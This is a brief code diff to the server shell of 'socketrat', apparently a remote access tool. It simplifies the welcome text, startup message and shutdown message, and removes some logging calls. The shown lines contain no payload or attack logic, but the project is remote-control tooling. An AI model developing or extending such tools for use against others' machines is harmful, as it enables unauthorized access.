@@ -90,9 +90,7 @@ class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
 
 
 class RATServerCmd(cmd.Cmd):
-    greeting = 'Welcome to the socketrat shell.\nType help or ? to list commands.\n'
-    intro = greeting
-    outro = 'Thank you for using socketrat.'
+    intro = 'Welcome to the socketrat shell. Type help or ? to list commands.\n'
     prompt = '(socketrat) '
     ruler = '-'
     nohelp = '*** No help on %s'
@@ -219,14 +217,10 @@ if __name__ == '__main__':
 
         sh = RATServerCmd(server)
 
-        sh.info('Listening on {} port {} ...'.format(host, port))
-        print()
-        print(sh.greeting)
-
+        print('Serving on {} port {} ...'.format(host, port))
         try:
-            sh.cmdloop(intro='')
+            sh.cmdloop()
         finally:
-            sh.info('Stopping server ...')
             server.shutdown()
-            print(sh.outro)
+            print('Server stopped, exiting.')
 
